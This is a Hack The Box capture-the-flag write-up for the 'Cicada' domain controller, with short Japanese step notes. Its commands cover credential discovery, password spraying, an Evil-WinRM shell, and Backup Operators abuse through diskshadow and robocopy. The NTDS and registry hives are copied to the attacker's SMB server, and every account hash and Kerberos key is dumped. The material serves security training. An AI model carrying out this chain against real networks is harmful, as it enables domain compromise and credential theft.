https://app.hackthebox.com/machines/627

## STEP 1
```sh
└─$ rustscan -a 10.129.231.149 --no-banner --scripts none                
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.129.231.149:53
Open 10.129.231.149:88
Open 10.129.231.149:135
Open 10.129.231.149:139
Open 10.129.231.149:389
Open 10.129.231.149:445
Open 10.129.231.149:464
Open 10.129.231.149:593
Open 10.129.231.149:636
Open 10.129.231.149:3268
Open 10.129.231.149:3269
Open 10.129.231.149:5985
Open 10.129.231.149:53443
10.129.231.149 -> [53,88,135,139,389,445,464,593,636,3268,3269,5985,53443]
```


## STEP 2
guestでsmb列挙  
テキストファイルを発見
```sh
└─$ netexec smb 10.129.231.149 -u ' ' -p '' -M spider_plus                        
SMB         10.129.231.149  445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False) 
SMB         10.129.231.149  445    CICADA-DC        [+] cicada.htb\ : (Guest)
SPIDER_PLUS 10.129.231.149  445    CICADA-DC        [*] Started module spidering_plus with the following options:
SPIDER_PLUS 10.129.231.149  445    CICADA-DC        [*]  DOWNLOAD_FLAG: False
SPIDER_PLUS 10.129.231.149  445    CICADA-DC        [*]     STATS_FLAG: True
SPIDER_PLUS 10.129.231.149  445    CICADA-DC        [*] EXCLUDE_FILTER: ['print$', 'ipc$']
SPIDER_PLUS 10.129.231.149  445    CICADA-DC        [*]   EXCLUDE_EXTS: ['ico', 'lnk']
SPIDER_PLUS 10.129.231.149  445    CICADA-DC        [*]  MAX_FILE_SIZE: 50 KB
SPIDER_PLUS 10.129.231.149  445    CICADA-DC        [*]  OUTPUT_FOLDER: /home/kali/.nxc/modules/nxc_spider_plus
SMB         10.129.231.149  445    CICADA-DC        [*] Enumerated shares
SMB         10.129.231.149  445    CICADA-DC        Share           Permissions     Remark
SMB         10.129.231.149  445    CICADA-DC        -----           -----------     ------
SMB         10.129.231.149  445    CICADA-DC        ADMIN$                          Remote Admin
SMB         10.129.231.149  445    CICADA-DC        C$                              Default share
SMB         10.129.231.149  445    CICADA-DC        DEV                             
SMB         10.129.231.149  445    CICADA-DC        HR              READ            
SMB         10.129.231.149  445    CICADA-DC        IPC$            READ            Remote IPC
SMB         10.129.231.149  445    CICADA-DC        NETLOGON                        Logon server share 
SMB         10.129.231.149  445    CICADA-DC        SYSVOL                          Logon server share 
SPIDER_PLUS 10.129.231.149  445    CICADA-DC        [+] Saved share-file metadata to "/home/kali/.nxc/modules/nxc_spider_plus/10.129.231.149.json".
SPIDER_PLUS 10.129.231.149  445    CICADA-DC        [*] SMB Shares:           7 (ADMIN$, C$, DEV, HR, IPC$, NETLOGON, SYSVOL)
SPIDER_PLUS 10.129.231.149  445    CICADA-DC        [*] SMB Readable Shares:  2 (HR, IPC$)
SPIDER_PLUS 10.129.231.149  445    CICADA-DC        [*] SMB Filtered Shares:  1
SPIDER_PLUS 10.129.231.149  445    CICADA-DC        [*] Total folders found:  0
SPIDER_PLUS 10.129.231.149  445    CICADA-DC        [*] Total files found:    1
SPIDER_PLUS 10.129.231.149  445    CICADA-DC        [*] File size average:    1.24 KB
SPIDER_PLUS 10.129.231.149  445    CICADA-DC        [*] File size min:        1.24 KB
SPIDER_PLUS 10.129.231.149  445    CICADA-DC        [*] File size max:        1.24 KB
                                
└─$ cat /home/kali/.nxc/modules/nxc_spider_plus/10.129.231.149.json 
{
    "HR": {
        "Notice from HR.txt": {
            "atime_epoch": "2024-08-28 17:31:48",
            "ctime_epoch": "2024-03-14 12:29:03",
            "mtime_epoch": "2024-08-28 17:31:48",
            "size": "1.24 KB"
        }
    }
}  
```
テキストファイル内にデフォルトパスワードを発見
```sh
└─$ netexec smb 10.129.231.149 -u ' ' -p '' --share HR --get-file 'Notice from HR.txt' '/home/kali/Notice_from_HR.txt'
SMB         10.129.231.149  445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False) 
SMB         10.129.231.149  445    CICADA-DC        [+] cicada.htb\ : (Guest)
SMB         10.129.231.149  445    CICADA-DC        [*] Copying "Notice from HR.txt" to "/home/kali/Notice_from_HR.txt"
SMB         10.129.231.149  445    CICADA-DC        [+] File "Notice from HR.txt" was downloaded to "/home/kali/Notice_from_HR.txt"
                                                                                                                                                                       
└─$ cat Notice_from_HR.txt                              

Dear new hire!

Welcome to Cicada Corp! We're thrilled to have you join our team. As part of our security protocols, it's essential that you change your default password to something unique and secure.

Your default password is: Cicada$M6Corpb*@Lp#nZp!8

To change your password:

1. Log in to your Cicada Corp account** using the provided username and the default password mentioned above.
2. Once logged in, navigate to your account settings or profile settings section.
3. Look for the option to change your password. This will be labeled as "Change Password".
4. Follow the prompts to create a new password**. Make sure your new password is strong, containing a mix of uppercase letters, lowercase letters, numbers, and special characters.
5. After changing your password, make sure to save your changes.

Remember, your password is a crucial aspect of keeping your account secure. Please do not share your password with anyone, and ensure you use a complex password.

If you encounter any issues or need assistance with changing your password, don't hesitate to reach out to our support team at support@cicada.htb.

Thank you for your attention to this matter, and once again, welcome to the Cicada Corp team!

Best regards,
Cicada Corp
```
ユーザを列挙するために、ridブルート実施
```sh
└─$ netexec smb 10.129.231.149 -u ' ' -p '' --rid-brute --log temp.txt
SMB         10.129.231.149  445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False) 
SMB         10.129.231.149  445    CICADA-DC        [-] Error checking if user is admin on 10.129.231.149: The NETBIOS connection with the remote host timed out.
SMB         10.129.231.149  445    CICADA-DC        [+] cicada.htb\ : (Guest)
SMB         10.129.231.149  445    CICADA-DC        498: CICADA\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        500: CICADA\Administrator (SidTypeUser)
SMB         10.129.231.149  445    CICADA-DC        501: CICADA\Guest (SidTypeUser)
SMB         10.129.231.149  445    CICADA-DC        502: CICADA\krbtgt (SidTypeUser)
SMB         10.129.231.149  445    CICADA-DC        512: CICADA\Domain Admins (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        513: CICADA\Domain Users (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        514: CICADA\Domain Guests (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        515: CICADA\Domain Computers (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        516: CICADA\Domain Controllers (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        517: CICADA\Cert Publishers (SidTypeAlias)
SMB         10.129.231.149  445    CICADA-DC        518: CICADA\Schema Admins (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        519: CICADA\Enterprise Admins (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        520: CICADA\Group Policy Creator Owners (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        521: CICADA\Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        522: CICADA\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        525: CICADA\Protected Users (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        526: CICADA\Key Admins (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        527: CICADA\Enterprise Key Admins (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        553: CICADA\RAS and IAS Servers (SidTypeAlias)
SMB         10.129.231.149  445    CICADA-DC        571: CICADA\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.129.231.149  445    CICADA-DC        572: CICADA\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.129.231.149  445    CICADA-DC        1000: CICADA\CICADA-DC$ (SidTypeUser)
SMB         10.129.231.149  445    CICADA-DC        1101: CICADA\DnsAdmins (SidTypeAlias)
SMB         10.129.231.149  445    CICADA-DC        1102: CICADA\DnsUpdateProxy (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        1103: CICADA\Groups (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        1104: CICADA\john.smoulder (SidTypeUser)
SMB         10.129.231.149  445    CICADA-DC        1105: CICADA\sarah.dantelia (SidTypeUser)
SMB         10.129.231.149  445    CICADA-DC        1106: CICADA\michael.wrightson (SidTypeUser)
SMB         10.129.231.149  445    CICADA-DC        1108: CICADA\david.orelious (SidTypeUser)
SMB         10.129.231.149  445    CICADA-DC        1109: CICADA\Dev Support (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        1601: CICADA\emily.oscars (SidTypeUser)
```
パスワードスプレー実施、michael.wrightsonでログイン成功を確認
```sh
└─$ grep 'SidTypeUser' temp.txt | awk '{print $13}' | sed 's/CICADA\\//' > users.txt

└─$ netexec smb 10.129.231.149 -u users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8' --continue-on-success
SMB         10.129.231.149  445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False) 
SMB         10.129.231.149  445    CICADA-DC        [-] cicada.htb\Administrator:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.129.231.149  445    CICADA-DC        [-] cicada.htb\Guest:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.129.231.149  445    CICADA-DC        [-] cicada.htb\krbtgt:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.129.231.149  445    CICADA-DC        [-] cicada.htb\CICADA-DC$:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.129.231.149  445    CICADA-DC        [-] cicada.htb\john.smoulder:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.129.231.149  445    CICADA-DC        [-] cicada.htb\sarah.dantelia:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.129.231.149  445    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8 
SMB         10.129.231.149  445    CICADA-DC        [-] cicada.htb\david.orelious:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.129.231.149  445    CICADA-DC        [-] cicada.htb\emily.oscars:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE
```
しかしmichael.wrightsonでは、winrmログインできないもよう
```sh
└─$ netexec ldap 10.129.231.149 -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8' --groups 'Remote Management Users'
LDAP        10.129.231.149  389    CICADA-DC        [*] Windows Server 2022 Build 20348 (name:CICADA-DC) (domain:cicada.htb)
LDAP        10.129.231.149  389    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8 
LDAP        10.129.231.149  389    CICADA-DC        Emily Oscars
```


## STEP 3
ユーザ列挙すると、descriptionにdavid.oreliousのパスワードを確認
```sh
└─$ netexec smb 10.129.231.149 -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8' --users
SMB         10.129.231.149  445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False) 
SMB         10.129.231.149  445    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8 
SMB         10.129.231.149  445    CICADA-DC        -Username-                    -Last PW Set-       -BadPW- -Description-
SMB         10.129.231.149  445    CICADA-DC        Administrator                 2024-08-26 20:08:03 0       Built-in account for administering the computer/domain 
SMB         10.129.231.149  445    CICADA-DC        Guest                         2024-08-28 17:26:56 0       Built-in account for guest access to the computer/domain 
SMB         10.129.231.149  445    CICADA-DC        krbtgt                        2024-03-14 11:14:10 0       Key Distribution Center Service Account 
SMB         10.129.231.149  445    CICADA-DC        john.smoulder                 2024-03-14 12:17:29 0        
SMB         10.129.231.149  445    CICADA-DC        sarah.dantelia                2024-03-14 12:17:29 0        
SMB         10.129.231.149  445    CICADA-DC        michael.wrightson             2024-03-14 12:17:29 0        
SMB         10.129.231.149  445    CICADA-DC        david.orelious                2024-03-14 12:17:29 0       Just in case I forget my password is aRt$Lp#7t*VQ!3 
SMB         10.129.231.149  445    CICADA-DC        emily.oscars                  2024-08-22 21:20:17 0        
SMB         10.129.231.149  445    CICADA-DC        [*] Enumerated 8 local users: CICADA
```
david.oreliousでログイン成功
```sh
└─$ netexec smb 10.129.231.149 -u david.orelious -p 'aRt$Lp#7t*VQ!3'    
SMB         10.129.231.149  445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False) 
SMB         10.129.231.149  445    CICADA-DC        [+] cicada.htb\david.orelious:aRt$Lp#7t*VQ!3
```


## STEP 4
devがreadできるようになった
```sh
└─$ netexec smb 10.129.231.149 -u david.orelious -p 'aRt$Lp#7t*VQ!3' --shares
SMB         10.129.231.149  445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False) 
SMB         10.129.231.149  445    CICADA-DC        [+] cicada.htb\david.orelious:aRt$Lp#7t*VQ!3 
SMB         10.129.231.149  445    CICADA-DC        [*] Enumerated shares
SMB         10.129.231.149  445    CICADA-DC        Share           Permissions     Remark
SMB         10.129.231.149  445    CICADA-DC        -----           -----------     ------
SMB         10.129.231.149  445    CICADA-DC        ADMIN$                          Remote Admin
SMB         10.129.231.149  445    CICADA-DC        C$                              Default share
SMB         10.129.231.149  445    CICADA-DC        DEV             READ            
SMB         10.129.231.149  445    CICADA-DC        HR              READ            
SMB         10.129.231.149  445    CICADA-DC        IPC$            READ            Remote IPC
SMB         10.129.231.149  445    CICADA-DC        NETLOGON        READ            Logon server share 
SMB         10.129.231.149  445    CICADA-DC        SYSVOL          READ            Logon server share
```
dev内にpowershellスクリプトを確認
```sh
└─$ smbclient -U 'cicada.htb/david.orelious%aRt$Lp#7t*VQ!3' //10.129.231.149/DEV 
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Thu Mar 14 08:31:39 2024
  ..                                  D        0  Thu Mar 14 08:21:29 2024
  Backup_script.ps1                   A      601  Wed Aug 28 13:28:22 2024

                4168447 blocks of size 4096. 466566 blocks available
```
emily.oscarsのクレデンシャルを平文で確認
```sh
└─$ smbget -U 'cicada.htb/david.orelious%aRt$Lp#7t*VQ!3' smb://10.129.231.149/DEV/Backup_script.ps1
Using domain: CICADA.HTB, user: david.orelious
smb://10.129.231.149/DEV/Backup_script.ps1
                
Downloaded 601b in 6 seconds
                
└─$ cat Backup_script.ps1                                          

$sourceDirectory = "C:\smb"
$destinationDirectory = "D:\Backup"

$username = "emily.oscars"
$password = ConvertTo-SecureString "Q!3@Lp#M6b*7t*Vt" -AsPlainText -Force
$credentials = New-Object System.Management.Automation.PSCredential($username, $password)
$dateStamp = Get-Date -Format "yyyyMMdd_HHmmss"
$backupFileName = "smb_backup_$dateStamp.zip"
$backupFilePath = Join-Path -Path $destinationDirectory -ChildPath $backupFileName
Compress-Archive -Path $sourceDirectory -DestinationPath $backupFilePath
Write-Host "Backup completed successfully. Backup file saved to: $backupFilePath"
```
step2でemily.oscarsはwinrmログイン可能と確認  
winrmログイン成功、ユーザフラグゲット
```powershell
└─$ evil-winrm -i 10.129.231.149 -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt' 
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> cat ../desktop/user.txt
579f573c819fbd3f6f8e35448f29d77c
```


## STEP 5
Backup Operatorsに所属していることを確認
```powershell
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes
========================================== ================ ============ ==================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Backup Operators                   Alias            S-1-5-32-551 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Certificate Service DCOM Access    Alias            S-1-5-32-574 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288
```
ということで、robocopyでrootフラグを取得できる
```powershell
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> robocopy 'c:\users\administrator\desktop' 'c:\users\emily.oscars.cicada\documents' root.txt /b /np /njh /njs

                           1    c:\users\administrator\desktop\
            New File                  34        root.txt
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> cat root.txt
c999fdba86c7923c3bee1a3176ac4320
```
せっかくなので、クレデンシャルをダンプする  
diskshadow経由でntdsをダンプするために、スクリプト作成
```sh
└─$ cat diskshadow.txt   
set metadata C:\windows\temp\meta.cab
set context persistent nowriters
add volume c: alias test
create
expose %test% z:

└─$ unix2dos diskshadow.txt 
unix2dos: converting file diskshadow.txt to DOS format...

└─$ impacket-smbserver share . -smb2support
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
```
diskshadowでシャドーコピー作成
```powershell
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> copy \\10.10.16.15\share\diskshadow.txt

*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> diskshadow.exe /s diskshadow.txt
Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  CICADA-DC,  10/21/2025 1:12:52 PM

-> set metadata C:\windows\temp\meta.cab
-> set context persistent nowriters
-> add volume c: alias test
-> create
Alias test for shadow ID {2255d8a5-ed8d-4249-9f4b-4e38d98f3ea0} set as environment variable.
Alias VSS_SHADOW_SET for shadow set ID {5242cb07-6502-4cd0-be50-63c919bd8011} set as environment variable.

Querying all shadow copies with the shadow copy set ID {5242cb07-6502-4cd0-be50-63c919bd8011}

        * Shadow copy ID = {2255d8a5-ed8d-4249-9f4b-4e38d98f3ea0}               %test%
                - Shadow copy set: {5242cb07-6502-4cd0-be50-63c919bd8011}       %VSS_SHADOW_SET%
                - Original count of shadow copies = 1
                - Original volume name: \\?\Volume{fcebaf9b-0000-0000-0000-500600000000}\ [C:\]
                - Creation time: 10/21/2025 1:12:53 PM
                - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
                - Originating machine: CICADA-DC.cicada.htb
                - Service machine: CICADA-DC.cicada.htb
                - Not exposed
                - Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
                - Attributes:  No_Auto_Release Persistent No_Writers Differential

Number of shadow copies listed: 1
-> expose %test% z:
-> %test% = {2255d8a5-ed8d-4249-9f4b-4e38d98f3ea0}
The shadow copy was successfully exposed as z:\.
->
```
シャドーコピーからntds.ditと各種レジストリをコピーし、kaliのsmbサーバにコピー
```powershell
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> robocopy z:\windows\ntds\ . ntds.dit /b /np /njh /njs

                           1    z:\windows\ntds\
            New File              16.0 m        ntds.dit

*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> robocopy z:\windows\system32\config . SAM /b /np /njh /njs

                           1    z:\windows\system32\config\
            New File               65536        SAM
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> robocopy z:\windows\system32\config . SECURITY /b /np /njh /njs

                           1    z:\windows\system32\config\
            New File               65536        SECURITY
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> robocopy z:\windows\system32\config . SYSTEM /b /np /njh /njs

                           1    z:\windows\system32\config\
            New File              18.0 m        SYSTEM

*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> copy ntds.dit \\10.10.16.15\share\

*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> copy SAM \\10.10.16.15\share\

*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> copy SECURITY \\10.10.16.15\share\

*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> copy SYSTEM \\10.10.16.15\share\
```
ローカルでクレデンシャルダンプ成功
```sh
└─$ impacket-secretsdump -system SYSTEM -security SECURITY -sam SAM -ntds ntds.dit LOCAL         
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x3c2b033757a49110a9ee680b46e8d620
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
$MACHINE.ACC:plain_password_hex:6209748a5ab74c44bd98fc5015b6646467841a634c4a1b2d6733289c33f76fc6427f7ccd8f6d978a79eec3ae49eb8c0b5b14e193ec484ea1152e8a04e01a3403b3111c0373d126a566660a7dd083aec1921d53a82bc5129408627ae5be5e945ed58cfb77a2a50e9ffe7e6a4531febd965181e528815d264885921118fb7a74eff51306dbffa4d6a0c995be5c35063576fc4a3eba39d0168d4601da0a0c12748ae870ff36d7fb044649032f550f04c017f6d94675b3517d06450561c71ddf8734100898bf2c19359c69d1070977f070e3b8180210a92488534726005588c0f269a7e182c3c04b96f7b5bc4af488e128f8
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:188c2f3cb7592e18d1eae37991dee696
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x0e3d4a419282c47327eb03989632b3bef8998f71
dpapi_userkey:0x4bb80d985193ae360a4d97f3ca06350b02549fbb
[*] NL$KM 
 0000   CC 15 01 F7 64 39 1E 7A  5E 53 8C C1 74 E6 2B 01   ....d9.z^S..t.+.
 0010   36 9B 50 B8 D0 72 23 D9  B6 C5 6E 92 2F 57 08 D8   6.P..r#...n./W..
 0020   1E BA 8E 81 23 25 03 27  36 4C 19 B4 96 CD 25 1F   ....#%.'6L....%.
 0030   8F F9 7F 5D 71 E6 6E 8C  FF CB EB 5E 4E A4 E6 96   ...]q.n....^N...
NL$KM:cc1501f764391e7a5e538cc174e62b01369b50b8d07223d9b6c56e922f5708d81eba8e8123250327364c19b496cd251f8ff97f5d71e66e8cffcbeb5e4ea4e696
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: f954f575c626d6afe06c2b80cc2185e6
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
CICADA-DC$:1000:aad3b435b51404eeaad3b435b51404ee:188c2f3cb7592e18d1eae37991dee696:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:3779000802a4bb402736bee52963f8ef:::
cicada.htb\john.smoulder:1104:aad3b435b51404eeaad3b435b51404ee:0d33a055d07e231ce088a91975f28dc4:::
cicada.htb\sarah.dantelia:1105:aad3b435b51404eeaad3b435b51404ee:d1c88b5c2ecc0e2679000c5c73baea20:::
cicada.htb\michael.wrightson:1106:aad3b435b51404eeaad3b435b51404ee:b222964c9f247e6b225ce9e7c4276776:::
cicada.htb\david.orelious:1108:aad3b435b51404eeaad3b435b51404ee:ef0bcbf3577b729dcfa6fbe1731d5a43:::
cicada.htb\emily.oscars:1601:aad3b435b51404eeaad3b435b51404ee:559048ab2d168a4edf8e033d43165ee5:::
[*] Kerberos keys from ntds.dit 
Administrator:aes256-cts-hmac-sha1-96:e47fd7646fa8cf1836a79166f5775405834e2c060322d229bc93f26fb67d2be5
Administrator:aes128-cts-hmac-sha1-96:f51b243b116894bea389709127df1652
Administrator:des-cbc-md5:c8838c9b10c43b23
CICADA-DC$:aes256-cts-hmac-sha1-96:e9752f2c7752bd92142588e63dc0383499f49b04a46de37845e33d40de1db7ed
CICADA-DC$:aes128-cts-hmac-sha1-96:7fc8e7f2daa14d0ccdf070de9cfc49c5
CICADA-DC$:des-cbc-md5:b0f7cdec040d5b6d
krbtgt:aes256-cts-hmac-sha1-96:357f15dd4d315af47ac63658c444526ec0186f066ad9efb46906a7308b7c60c8
krbtgt:aes128-cts-hmac-sha1-96:39cbc0f220550c51fb89046ac652849e
krbtgt:des-cbc-md5:73b6c419b3b9bf7c
cicada.htb\john.smoulder:aes256-cts-hmac-sha1-96:57ae6faf294b7e6fbd0ce5121ac413d529ae5355535e20739a19b6fd2a204128
cicada.htb\john.smoulder:aes128-cts-hmac-sha1-96:8c0add65bd3c9ad2d1f458a719cfda81
cicada.htb\john.smoulder:des-cbc-md5:f1feaeb594b08575
cicada.htb\sarah.dantelia:aes256-cts-hmac-sha1-96:e25f0b9181f532a85310ba6093f24c1f2f10ee857a97fe18d716ec713fc47060
cicada.htb\sarah.dantelia:aes128-cts-hmac-sha1-96:2ac9a92bca49147a0530e5ce84ceee7d
cicada.htb\sarah.dantelia:des-cbc-md5:0b5b014370fdab67
cicada.htb\michael.wrightson:aes256-cts-hmac-sha1-96:d89ff79cc85032f27499425d47d3421df678eace01ce589eb128a6ffa0216f46
cicada.htb\michael.wrightson:aes128-cts-hmac-sha1-96:f1290a5c4e9d4ef2cd7ad470600124a9
cicada.htb\michael.wrightson:des-cbc-md5:eca8d532fd8f26bc
cicada.htb\david.orelious:aes256-cts-hmac-sha1-96:125726466d0431ed1441caafe8c0ed9ec0d10b0dbaf4fec7a184b764d8a36323
cicada.htb\david.orelious:aes128-cts-hmac-sha1-96:ce66c04e5fd902b15f5d4c611927c9c2
cicada.htb\david.orelious:des-cbc-md5:83585bc41573897f
cicada.htb\emily.oscars:aes256-cts-hmac-sha1-96:4abe28adc1d16373f4c8db4d9bfd34ea1928aca72cb69362d3d90f69d80c000f
cicada.htb\emily.oscars:aes128-cts-hmac-sha1-96:f98d74d70dfb68b70ddd821edcd6a023
cicada.htb\emily.oscars:des-cbc-md5:fd4a5497d38067cd
[*] Cleaning up...
```
